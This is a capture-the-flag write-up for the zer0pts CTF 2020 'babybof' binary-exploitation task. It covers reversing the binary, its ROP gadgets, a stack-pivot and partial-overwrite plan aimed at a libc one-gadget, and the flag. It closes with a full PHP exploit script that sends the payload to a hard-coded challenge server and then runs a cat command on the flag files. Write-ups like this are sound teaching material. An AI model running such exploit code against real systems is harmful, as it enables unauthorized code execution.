# babybof - zer0pts CTF 2020 (pwn, 590p, 17 solved)
## Introduction

babybof is a pwn task.

An archive containing a binary, and a libc is provided.

## Reverse engineering

The binary is a `baby` task : it is minimalist.

It only sets up the stream buffers by calling `setbuf` on `stdin`, `stdout` and
`stderr`. It then read 0x200 bytes in a 32-bytes buffer and calls exit.

This yields ROP, but there are only 7 gadgets in total :
```
0x0040043e: call qword [rbp+0x48] ;  (1 found)
0x00400498: dec ecx ; ret  ;  (1 found)
0x00400499: leave  ; ret  ;  (1 found)
0x0040049b: pop r15 ; ret  ;  (1 found)
0x0040047c: pop rbp ; ret  ;  (1 found)
0x0040049c: pop rdi ; ret  ;  (1 found)
0x0040049e: pop rsi ; ret  ;  (1 found)
```

The binary imports function from the libc, but the global offset table is
read-only.

## Exploitation

While the global offset table is read-only, the pointers to `stdin`, `stdout`
and `stderr` are stored at the beginning of the BSS section, and are writeable.

The idea is to call read multiple times :
1. first to pivot a new stack in the BSS section (for example at BSS +
   0x50) and clear the stack for a one-gadget
2. then pivot again, this time before the stream buffers
3. finall, overwrite one of the stream buffers partially and use it as a return
   address

The 3 last bytes of a one-shot gadget (libc + 0xF1147) can be used. This result
in an exploit that works once every 4096 times on average.

**Flag**: `zer0pts{b0f_i5_4lw4y5_d4ng3r0u5}`

## Appendices

### pwn.php

```php
#!/usr/bin/php
<?php
require_once("Socket.php");

const POPR15 = 0x0040049b; // pop r15 ; ret  ;  (1 found)
const POPRBP = 0x0040047c; // pop rbp ; ret  ;  (1 found)
const POPRDI = 0x0040049c; // pop rdi ; ret  ;  (1 found)
const POPRSI = 0x0040049e; // pop rsi ; ret  ;  (1 found)

const CALL   = 0x0040043e; // call qword [rbp+0x48] ;  (1 found)
const DECECX = 0x00400498; // dec ecx ; ret  ;  (1 found)
const LEAVE  = 0x00400499;

const READ   = 0x0040048b;

const BSS = 0x601000;
const RET = 0x0040049f;

$what = 0x7ffff7a0d000 + 0x000f1147;

$t = new Socket("13.231.207.73", 9002);

/* Read in stack */
$payload = str_repeat("A", 0x28) . pack("Q*",
	POPRBP, BSS + 0x50 + 0x20,
	READ,
);
$payload = str_pad($payload, 0x200, "\x00");


/* Second read */
$payload .= str_repeat("\x00", 0x28);
$payload .= pack("Q*",
	POPRBP, BSS + 0x20,
	READ,
);
$payload = str_pad($payload, 0x400, "\x00");

/* Partial overwrite */
$payload .= str_repeat("\x00", 0x28);
$payload .= pack("Q", RET);
$payload .= substr(pack("Q", $what), 0, 3);

$t->write($payload);

usleep(5e5);

try {
	@$t->write("/bin/cat /home/pwn/*flag*\n");
	while($packet = @$t->readLine())
		printf("%s\n", $packet);
} catch(TypeError $e) {
	exit;
} catch(Exception $e) {
	exit;
}
```